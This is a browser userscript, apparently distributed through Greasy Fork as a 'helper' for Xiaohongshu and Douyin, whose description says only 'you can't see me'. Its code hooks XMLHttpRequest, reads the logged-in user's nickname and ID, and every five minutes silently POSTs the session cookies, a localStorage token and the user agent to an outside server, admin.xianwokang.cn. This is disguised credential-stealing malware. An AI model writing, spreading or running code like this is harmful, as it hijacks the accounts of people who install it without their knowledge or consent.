// ==UserScript==
// @name         悦芙助手
// @namespace    http://atishoo.cn/
// @version      1.4
// @description  你看不见我你看不见我你看不见我
// @author       atishoo
// @match        *://*.xiaohongshu.com/*
// @match        *://*.douyin.com/*
// @require      https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js
// @grant        none
// @run-at       document-start
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/491404/%E6%82%A6%E8%8A%99%E5%8A%A9%E6%89%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/491404/%E6%82%A6%E8%8A%99%E5%8A%A9%E6%89%8B.meta.js
// ==/UserScript==

function sync(data){
    $.ajax('https://admin.xianwokang.cn/index.php/api/sync/session', {type:'POST',contentType: 'application/json',data:JSON.stringify(data)})
}
(function() {
    'use strict';
    if (localStorage.atishoo_pt === undefined) {
        localStorage.setItem('atishoo_pt', 0);
    }
    var openfunc = window.XMLHttpRequest.prototype.open
    window.XMLHttpRequest.prototype.open = function(method, url) {
        (function(pointer){
            pointer.addEventListener('load', function(e) {
                if (pointer.responseURL.indexOf('api/sns/web/v2/user/me') > -1) {
                    const obj = JSON.parse(e.currentTarget.responseText);
                    if (obj.code===0 && obj.success && !obj.data.guest) {
                        window.AtishooProfile = {
                            nickname: obj.data.nickname,
                            red_id: obj.data.red_id,
                            user_id: obj.data.user_id,
                        }
                    }
                }
            });
        })(this)
        if (url.indexOf('edith.xiaohongshu.com') > 0) {
            if (window.AtishooProfile !== undefined && Date.now()-parseInt(localStorage.atishoo_pt)>5*60*1000) {
                sync({value:{cookie:document.cookie,b1:localStorage.b1},nickname:window.AtishooProfile.nickname,puid: window.AtishooProfile.user_id, type:'xhs'})
                localStorage.setItem('atishoo_pt', Date.now())
            }
        } else if (url.indexOf('aweme/v1/web') > 0) {
            var nickname = '', puid = '';
            if (localStorage.getItem('user_info')!==undefined) {
                var userinfo = JSON.parse(localStorage.getItem('user_info'));
                nickname = userinfo.nickname;
                puid = userinfo.uid;
            }
            if (nickname !== '' && puid !== '' && Date.now()-parseInt(localStorage.atishoo_pt)>5*60*1000) {
                sync({value:{cookie:document.cookie, useragent:window.navigator.userAgent},nickname:nickname,puid:puid, type:'douyin'});
                localStorage.setItem('atishoo_pt', Date.now())
            }
        }
        openfunc.apply(this, arguments);
    };
})();